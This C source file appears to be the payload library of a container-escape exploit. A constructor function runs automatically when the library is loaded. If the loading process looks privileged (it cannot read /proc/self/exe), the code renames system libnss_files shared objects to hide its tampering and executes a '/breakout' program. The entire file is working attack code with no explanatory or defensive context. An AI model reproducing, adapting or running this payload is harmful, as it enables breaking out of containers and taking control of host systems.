#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>


bool is_privileged();

__attribute__ ((constructor)) void run_at_link(void)
{	
	char * argv_break[2];

	if(!is_privileged())
		return;
	
	rename("/lib/x86_64-linux-gnu/libnss_files-2.23.so", "/lib/x86_64-linux-gnu/foo.so");
	rename("/lib/x86_64-linux-gnu/libnss_files_orig.so", "/lib/x86_64-linux-gnu/libnss_files-2.23.so");

	
	if(!fork()) {
		argv_break[0] = strdup("/breakout");
		argv_break[1] = NULL;
		execve("/breakout", argv_break, NULL);
	} else wait(NULL);
	return;
}



bool is_privileged()
{
	FILE * proc_file = fopen("/proc/self/exe", "r");
	if(proc_file != NULL)
	{
		fclose(proc_file);
		return false;
	}
	return true;

}
